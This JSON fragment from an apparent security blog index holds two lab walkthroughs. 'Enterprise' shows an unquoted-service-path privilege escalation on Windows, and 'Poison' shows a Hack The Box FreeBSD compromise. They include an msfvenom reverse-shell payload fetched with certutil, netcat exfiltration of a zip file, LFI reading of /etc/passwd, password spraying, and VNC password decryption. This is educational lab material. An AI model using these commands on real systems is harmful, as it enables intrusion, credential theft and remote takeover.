unquoted service paths are a vulnerability that arises due to the way windows runs its binaries. say we have a program c:\\users\\public\\my programs\\new program.exe, windows will first try to execute c:\\users\\public\\my.exe followed by c:\\users\\public\\my program.exe, c:\\users\\public\\my program\\new.exe, and finally c:\\users\\public\\my programs\\new program.exe because of the spaces in and the path and lack of enclosing quotes. zerotieroneservice is vulnerable to this type of exploit.\nimportantly, the service binary is owned by nt authority\\system.\nc:\\users\\bitbucket\u0026gt;dir /q \u0026#34;c:\\program files (x86)\\zero tier\\zero tier one\\zerotier one.exe\u0026#34; volume in drive c has no label. volume serial number is 7cd9-a0ae directory of c:\\program files (x86)\\zero tier\\zero tier one 12/05/2014 11:52 am 9,594,056 nt authority\\system zerotier one.exe 1 file(s) 9,594,056 bytes 0 dir(s) 40,566,411,264 bytes free user permissions for c:\\program files (x86)\\zero tier:\nc:\\users\\bitbucket\u0026gt;icacls \u0026#34;c:\\program files (x86)\\zero tier\u0026#34; c:\\program files (x86)\\zero tier builtin\\users:(oi)(ci)(w) nt service\\trustedinstaller:(i)(f) nt service\\trustedinstaller:(i)(ci)(io)(f) nt authority\\system:(i)(f) nt authority\\system:(i)(oi)(ci)(io)(f) builtin\\administrators:(i)(f) builtin\\administrators:(i)(oi)(ci)(io)(f) builtin\\users:(i)(rx) builtin\\users:(i)(oi)(ci)(io)(gr,ge) creator owner:(i)(oi)(ci)(io)(f) application package authority\\all application packages:(i)(rx) application package authority\\all application packages:(i)(oi)(ci)(io)(gr,ge) application package authority\\all restricted application packages:(i)(rx) application package authority\\all restricted application packages:(i)(oi)(ci)(io)(gr,ge) successfully processed 1 files; failed processing 0 files bitbucket, as a member of builtin\\users, has write access to the c:\\program files (x86)\\zero tier directory through builtin\\users. it is therefore possible to write a \u0026ldquo;zero.exe\u0026rdquo; binary have the zerotieroneservice execute it.\nmsfvenom -p windows/x64/shell_reverse_tcp lhost=10.13.48.55 lport=31337 -f exe -o zero.exe now to transfer it to our target\u0026hellip;\npython3 -m http.server 80 c:\\program files (x86)\\zero tier\u0026gt;certutil -urlcache -f http://10.13.48.55/zero.exe zero.exe next, i checked the status of zerotieroneservice.\nc:\\program files (x86)\\zero tier\u0026gt;sc query zerotieroneservice service_name: zerotieroneservice type : 10 win32_own_process state : 1 stopped win32_exit_code : 0 (0x0) service_exit_code : 0 (0x0) checkpoint : 0x0 wait_hint : 0x7d0 the service is not running. all that needs to be done now is to start the service and we should receive a shell as nt authority\\system (don\u0026rsquo;t forget to start a listener first).\nc:\\users\\bitbucket\u0026gt;sc start zerotieroneservice ┌──(kali㉿kali)-[~] └─$ rlwrap nc -nvlp 31337 listening on [any] 31337 ... connect to [10.13.48.55] from (unknown) [10.10.146.30] 49930 microsoft windows [version 10.0.17763.1817] (c) 2018 microsoft corporation. all rights reserved. c:\\windows\\system32\u0026gt;whoami whoami nt authority\\system c:\\windows\\system32\u0026gt; ","title":"Enterprise"},{"date":"2024-09-16","image":"","imageAlt":"","link":"http://localhost:1313/posts/poison/","summary":"\u003cp\u003e\u003cimg src=\"/img/poison/poison.png#center\" alt=\"Poison\"\u003e\u003c/p\u003e\n\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\u003cp\u003ePoison is a Medium difficulty FreeBSD box. Exploitation involves gaining a low-privilege shell through a vulnerable webapp and escalating privileges through improperly secured credentials.\u003c/p\u003e","tags":["FreeBSD","HTB","LFI","Port Forwarding","Unix","VNC"],"text":"\ndescription poison is a medium difficulty freebsd box. exploitation involves gaining a low-privilege shell through a vulnerable webapp and escalating privileges through improperly secured credentials.\nrecon we start by running a nmap scan against the target.\n┌──(kali㉿kali)-[~] └─$ sudo nmap -p- -a 10.10.10.84 -t5 starting nmap 7.94svn ( https://nmap.org ) at 2024-09-17 01:19 gmt warning: 10.10.10.84 giving up on port because retransmission cap hit (2). nmap scan report for 10.10.10.84 host is up (0.041s latency). not shown: 45954 filtered tcp ports (no-response), 19579 closed tcp ports (reset) port state service version 22/tcp open ssh openssh 7.2 (freebsd 20161230; protocol 2.0) | ssh-hostkey: | 2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (rsa) | 256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ecdsa) |_ 256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ed25519) 80/tcp open http apache httpd 2.4.29 ((freebsd) php/5.6.32) |_http-title: site doesn\u0026#39;t have a title (text/html; charset=utf-8). |_http-server-header: apache/2.4.29 (freebsd) php/5.6.32 aggressive os guesses: freebsd 11.0-release - 12.0-current (97%), freebsd 11.1-stable (97%), freebsd 11.2-release - 11.3 release or 11.2-stable (96%), freebsd 11.3-release (96%), freebsd 11.0-stable (95%), freebsd 11.1-release or 11.2-stable (95%), freebsd 11.1-release (95%), freebsd 11.0-current (94%), freebsd 11.0-release (94%), freebsd 12.0-release - 13.0-current (93%) no exact os matches for host (test conditions non-ideal). network distance: 2 hops service info: os: freebsd; cpe: cpe:/o:freebsd:freebsd traceroute (using port 3306/tcp) hop rtt address 1 40.51 ms 10.10.14.1 2 40.65 ms 10.10.10.84 os and service detection performed. please report any incorrect results at https://nmap.org/submit/ . nmap done: 1 ip address (1 host up) scanned in 120.47 seconds the scan shows that tcp ports 22 and 80 are open. visiting the webpage on port 80, we can see a website with the title \u0026ldquo;temporary website to test local .php scripts\u0026rdquo;.\nthere is a list of files that we can test. i tried listfiles.php. the output was messy, so i used view source to get a cleaner view.\nwe get a directory listing. it appears as if browse.php is executing php files that are passed to it. http wrappers are disabled unfortunately, so we can\u0026rsquo;t get a shell through rfi :(. we could also try other attack vectors like log poisoning (which does give you shell as www-data), but there is an interesting file \u0026ldquo;pwdbackup.txt\u0026rdquo; that we can check out first.\nsuccess! now all we need to do is decode the password. we will need to do this 13 times, as implied by the note from out unsuspecting target. this can be done by passing the password to base64 -d manually, but it\u0026rsquo;s far simpler to use a script. i\u0026rsquo;ve provided one below:\n#!/bin/bash encoded_pass=\u0026#34;vm0wd2qyuxlvwgxwv0d4wflurndvrlpzwkzoaljswjbuvlppv0zkc2jetlhhmk0xvmpks1iyskvubghotvvwvvztcedzv015u2twvqpir2hvvfzwd1zwwnrjrwrutwxksvztdgtxqxbpum5cufdwzdbsbvzhv25saljyulvuvluxu1zadgrgzfzam0jwvmxad1dwwnrnvfjqck1eqjrxa1prwvzkr1nsvlvwm040vgtaa2ntrkdar2hwv0vkvvdxegftmvzhwkzotlzgslrdazffuwpsv01qvlrzvezlyzjosvrswmkkv0donlzhegfzvk5ivwtsvwjxafdwmfzlvlzkwgvhrlrnbey0vji1u2exsxdxbuzeykzwelyyeg9xr0v4y0hkwfzscexvakzpzezkcwpar2dlwvrcwk1gwkhkr0zavms1r1rswmtzvkl5yuzkv01gwkxwbfprv0dwsfjsuk5wbkjzvmpkmgexwnrswhbwymtkrvlycedlvmxyclvstldnrez4vm10nfywmxvuak5hvm1ssfvqrldjd3bqujj0tfzxmdfrmkl4wkhoyvjgslhuv3hlujfsc1dtdfpwa2w1wvvat1ywmuckv2t4v2jgchjwmgrxu0dssgjfnwlsweeyvmpkmflxrxhxbljtv0hcv1ltczfsvmxzvm5kwfjsbdvdbvjit1zktljfwjrwbtewtkzkrwpxbk5qulhov1lxdgfvrmw2umxkamqzqlhza2rpvezkwgrhovjivlp6vji1u2fsslhvbgrvvmxwelrrwlplvtvwt1zwv2eydzfxvlzhcmexwxdnvwnlvjj0nfyyskdjr2hhulzwnfzswkdkr1jgtldotmjttjnwbxbltudjefvyaglsbvjwwvrkb1yxbhjwveztvm14elztehckvg1kr2neqkrivlpjvdfaa2fwwllra3byvmxadlperlpkd3bov0vavflrzg9hrlzzwkzowfjswnhvbxm1yw1relftafzivezqvkvaawpxr1zhv210tmjfwtbwakowvjfvevnrafzirnbwvmpou00xcfhlrmryujfasfdrwldhvkpzuw1gv2eyuxddazvhu2tkaljgbexwrlztcmmxskdjrfpoukd4rvdub3dpvu5uufqwswo=\u0026#34; for i in {1..13} do encoded_pass=$(echo -n \u0026#34;$encoded_pass\u0026#34; | base64 -d) done echo -n \u0026#34;$encoded_pass\u0026#34; after running the script, we get our password charix!2#4%6\u0026amp;8(0.\nfoothold we have a password, but we don\u0026rsquo;t know any users we could potentially authenticate as. recall that the webpage can read files. since we know that the target machine is likely freebsd, a unix-like os, we can try to read the /etc/passwd to find users.\nnotice there are three users: root, toor, and charix that seem interesting. we can spray our password against these accounts via ssh. it is true that charix!2#4%6\u0026amp;8(0 is likely the password for charix, it\u0026rsquo;s still worth checking the other accounts for password reuse.\nand now we can authenticate as charix to the server.\nprivilege escalation now that we have a shell, we can move onto privilege escalation. feel free to grab the user flag, but there is also a secret.zip file that might be interesting. it\u0026rsquo;s password protected though, and i find files easier to investigate when they are on my local machine. so i transferred the zip file to kali.\non kali:\n┌──(kali㉿kali)-[/tmp] └─$ nc -nvlp 8000 \u0026gt; secret.zip listening on [any] 8000 ... on poison:\ncharix@poison:~ % nc -nv 10.10.14.33 8000 \u0026lt; secret.zip connection to 10.10.14.33 8000 port [tcp/*] succeeded! before trying to crack the password, we can test for password reuse by supplying the password we got for charix . it succeeds and we get a secret file that appears to be random binary data. i couldn\u0026rsquo;t figure out its purpose at this point, so i decided to enumerate further. i noticed three tcp ports only accessible from localhost on poison: 25, 5801, and 5901.\ncharix@poison:~ % sockstat -4 user command pid fd proto local address foreign address www httpd 728 4 tcp4 *:80 *:* charix sshd 719 3 tcp4 10.10.10.84:22 10.10.14.33:57270 root sshd 716 3 tcp4 10.10.10.84:22 10.10.14.33:57270 www httpd 704 4 tcp4 *:80 *:* root sendmail 642 3 tcp4 127.0.0.1:25 *:* www httpd 641 4 tcp4 *:80 *:* www httpd 640 4 tcp4 *:80 *:* www httpd 639 4 tcp4 *:80 *:* www httpd 638 4 tcp4 *:80 *:* www httpd 637 4 tcp4 *:80 *:* root httpd 625 4 tcp4 *:80 *:* root sshd 620 4 tcp4 *:22 *:* root xvnc 529 1 tcp4 127.0.0.1:5901 *:* root xvnc 529 3 tcp4 127.0.0.1:5801 *:* root syslogd 390 7 udp4 *:514 *:* i had already checked for any mail-related privesc vectors at this point, so i was more interested in ports 5801 and 5901. however, since they were only accessible by localhost on poison, i had to forward them to my attacker machine.\n# forward port 5801 ssh -n -l 5801:127.0.0.1:5801 charix@10.10.10.84 # forward port 5901 ssh -n -l 5901:127.0.0.1:5901 charix@10.10.10.84 now we can do some more enumeration.\n┌──(kali㉿kali)-[~] └─$ sudo nmap -p5801,5901 127.0.0.1 -sv --script=default starting nmap 7.94svn ( https://nmap.org ) at 2024-09-17 19:27 gmt nmap scan report for localhost (127.0.0.1) host is up (0.000097s latency). port state service version 5801/tcp open http bacula http config 5901/tcp open vnc vnc (protocol 3.8) | vnc-info: | protocol version: 3.8 | security types: | vnc authentication (2) | tight (16) | tight auth subtypes: |_ stdv vncauth_ (2) service detection performed. please report any incorrect results at https://nmap.org/submit/ . nmap done: 1 ip address (1 host up) scanned in 10.83 seconds vnc is running on port 5901. vnc is a system designed to share screens. this means that a user using vnc can interact with\u0026hellip; the vnc password file is usually stored in ~/.vnc/passwd. this path does not exist for charix though, but there was a passwd file that we extracted from secret.zip. we can check if it it indeed a vnc password file by attempting to extract a vnc password:\n┌──(kali㉿kali)-[/tmp] └─$ cat secret | openssl enc -des-cbc -nopad -nosalt -k e84ad660c4721ae0 -iv 0000000000000000 -d vncp@$$! success! now that we are certain we have a vnc password file, we can use it to connect to poison.\n┌──(kali㉿kali)-[/tmp] └─$ vncviewer -passwd secret 127.0.0.1::5901 and with that, we have root on the machine.\n","title":"Poison"}]
}

